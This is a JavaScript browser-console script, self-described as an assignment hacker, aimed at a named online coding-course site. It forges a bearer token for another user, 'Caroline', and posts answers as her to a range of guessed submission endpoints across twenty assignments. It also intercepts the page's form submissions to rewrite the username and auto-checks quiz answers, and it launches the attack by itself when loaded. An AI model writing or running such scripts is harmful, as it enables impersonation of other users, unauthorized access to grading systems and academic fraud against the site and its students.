// Ultimate Brute Force Assignment Hacker
// This will hack assignments directly without token switching

console.log("🚀 BRUTE FORCE ASSIGNMENT HACKER - STARTING!");

const CAROLINE_USERNAME = "98ixul";
const BASE_URL = "https://coolcode-hacker-34c5455cd908.herokuapp.com";

// Known correct answers for Java assignments
const CORRECT_ANSWERS = {
    "java code files": ".java",
    "compiled java classes": ".class", 
    "running the compiled": "JRE",
    "PATH environment": "To locate the Java compiler",
    "not an OOPS concept": "Compilation",
    "out of memory": "OutOfMemoryError"
};

// Generate Caroline's token manually
function generateCarolineToken() {
    const carolineData = {
        username: CAROLINE_USERNAME,
        hash: "06b74b549d5075a14f21bcaf8553848a87e86738313255dbd2d68838384005290"
    };
    return btoa(JSON.stringify(carolineData));
}

// Direct API submission function
async function directAPISubmission(assignmentId, answers) {
    const carolineToken = generateCarolineToken();
    
    console.log(`📤 Direct API submission for assignment ${assignmentId}`);
    console.log(`👤 Submitting as: ${CAROLINE_USERNAME}`);
    
    const headers = {
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${carolineToken}`,
        'X-User': CAROLINE_USERNAME,
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    };
    
    const payload = {
        username: CAROLINE_USERNAME,
        user: CAROLINE_USERNAME,
        userId: CAROLINE_USERNAME,
        assignment_id: assignmentId,
        answers: answers,
        timestamp: Date.now()
    };
    
    // Try multiple endpoint variations
    const endpoints = [
        `/api/assignment/${assignmentId}/submit`,
        `/assignment/${assignmentId}/submit`,
        `/api/submit`,
        `/submit`,
        `/api/assignments/${assignmentId}`,
        `/coolcode/submit`,
        `/ui/assignment/${assignmentId}/submit`
    ];
    
    for (const endpoint of endpoints) {
        try {
            console.log(`🎯 Trying endpoint: ${BASE_URL}${endpoint}`);
            
            const response = await fetch(`${BASE_URL}${endpoint}`, {
                method: 'POST',
                headers: headers,
                body: JSON.stringify(payload)
            });
            
            console.log(`📊 Response status: ${response.status}`);
            
            if (response.ok) {
                const result = await response.text();
                console.log(`✅ SUCCESS! Assignment ${assignmentId} submitted for Caroline`);
                console.log(`📄 Response: ${result}`);
                return true;
            }
            
        } catch (error) {
            console.log(`❌ Error with ${endpoint}:`, error.message);
        }
    }
    
    return false;
}

// Brute force all assignments with correct answers
async function bruteForceAllAssignments() {
    console.log("🔥 Starting brute force attack on all assignments!");
    
    // Java assignment answers (these are the correct ones)
    const javaAnswers = [
        ".java",           // Question 1: Java code files
        ".class",          // Question 2: Compiled Java classes  
        "JRE",            // Question 3: Running compiled Java
        "To locate the Java compiler", // Question 4: PATH environment
        "Compilation",     // Question 5: Not an OOPS concept
        "OutOfMemoryError" // Question 6: Out of memory error
    ];
    
    let successCount = 0;
    
    // Try assignments 1-20
    for (let i = 1; i <= 20; i++) {
        console.log(`\n🎯 Attacking assignment ${i}...`);
        
        const success = await directAPISubmission(i, javaAnswers);
        if (success) {
            successCount++;
            console.log(`✅ Assignment ${i} hacked successfully!`);
        } else {
            console.log(`❌ Assignment ${i} failed`);
        }
        
        // Small delay to avoid rate limiting
        await new Promise(resolve => setTimeout(resolve, 500));
    }
    
    console.log(`\n🎉 Brute force complete! ${successCount}/20 assignments hacked for Caroline!`);
    return successCount;
}

// Alternative: Form submission hijacking
function hijackCurrentForm() {
    console.log("🔧 Hijacking current form submission...");
    
    // Find all forms on the page
    const forms = document.querySelectorAll('form');
    console.log(`Found ${forms.length} forms`);
    
    forms.forEach((form, index) => {
        console.log(`📝 Form ${index + 1}:`, form.action || 'No action');
        
        // Override form submission
        form.addEventListener('submit', function(e) {
            e.preventDefault();
            console.log("🚫 Intercepted form submission!");
            
            // Get form data
            const formData = new FormData(form);
            
            // Add/override username
            formData.set('username', CAROLINE_USERNAME);
            formData.set('user', CAROLINE_USERNAME);
            formData.set('userId', CAROLINE_USERNAME);
            
            console.log("📋 Modified form data:");
            for (let [key, value] of formData.entries()) {
                console.log(`  ${key}: ${value}`);
            }
            
            // Submit with Caroline's credentials
            fetch(form.action || window.location.href, {
                method: 'POST',
                headers: {
                    'Authorization': `Bearer ${generateCarolineToken()}`,
                    'X-User': CAROLINE_USERNAME
                },
                body: formData
            }).then(response => {
                console.log(`✅ Form submitted for Caroline! Status: ${response.status}`);
                return response.text();
            }).then(text => {
                console.log(`📄 Response: ${text.substring(0, 200)}...`);
            }).catch(error => {
                console.log(`❌ Form submission error:`, error);
            });
        });
    });
}

// Auto-solve current assignment
function autoSolveCurrentAssignment() {
    console.log("🧠 Auto-solving current assignment...");
    
    // Select all correct answers
    Object.entries(CORRECT_ANSWERS).forEach(([question, answer]) => {
        const labels = document.querySelectorAll('label');
        labels.forEach(label => {
            const text = label.textContent.toLowerCase();
            if (text.includes(answer.toLowerCase())) {
                const checkbox = label.querySelector('input[type="checkbox"]') || 
                               label.previousElementSibling?.querySelector('input[type="checkbox"]') ||
                               document.querySelector(`input[type="checkbox"][value*="${answer}"]`);
                
                if (checkbox) {
                    checkbox.checked = true;
                    console.log(`✅ Selected: ${answer}`);
                }
            }
        });
    });
    
    // Also try by proximity
    const checkboxes = document.querySelectorAll('input[type="checkbox"]');
    checkboxes.forEach(checkbox => {
        const label = checkbox.closest('label')?.textContent || 
                     checkbox.nextElementSibling?.textContent || '';
        
        Object.values(CORRECT_ANSWERS).forEach(answer => {
            if (label.toLowerCase().includes(answer.toLowerCase())) {
                checkbox.checked = true;
                console.log(`✅ Auto-selected: ${label.substring(0, 50)}...`);
            }
        });
    });
}

// Mass assignment navigation and hacking
async function massAssignmentHack() {
    console.log("🚀 Starting mass assignment hack!");
    
    for (let i = 1; i <= 20; i++) {
        console.log(`\n📚 Processing assignment ${i}...`);
        
        // Navigate to assignment
        window.location.href = `${BASE_URL}/ui/assignment/${i}`;
        
        // Wait for page load
        await new Promise(resolve => setTimeout(resolve, 2000));
        
        // Auto-solve
        autoSolveCurrentAssignment();
        
        // Wait a bit
        await new Promise(resolve => setTimeout(resolve, 1000));
        
        // Try direct API submission
        const javaAnswers = Object.values(CORRECT_ANSWERS);
        await directAPISubmission(i, javaAnswers);
        
        // Small delay before next assignment
        await new Promise(resolve => setTimeout(resolve, 1000));
    }
    
    console.log("🎉 Mass hack complete!");
}

// MAIN EXECUTION
console.log("🔧 Available commands:");
console.log("- bruteForceAllAssignments() - Brute force all 20 assignments via API");
console.log("- hijackCurrentForm() - Hijack current page form submissions");
console.log("- autoSolveCurrentAssignment() - Auto-solve current assignment");
console.log("- massAssignmentHack() - Navigate and hack all assignments");
console.log("- directAPISubmission(id, answers) - Direct API submission");

// Auto-start brute force if not on a specific assignment page
if (!window.location.href.includes('/assignment/')) {
    console.log("🚀 Auto-starting brute force attack...");
    setTimeout(() => {
        bruteForceAllAssignments();
    }, 1000);
} else {
    console.log("📚 On assignment page - setting up hijacking...");
    autoSolveCurrentAssignment();
    hijackCurrentForm();
}

// Export functions to global scope
window.bruteForceAllAssignments = bruteForceAllAssignments;
window.hijackCurrentForm = hijackCurrentForm;
window.autoSolveCurrentAssignment = autoSolveCurrentAssignment;
window.massAssignmentHack = massAssignmentHack;
window.directAPISubmission = directAPISubmission;
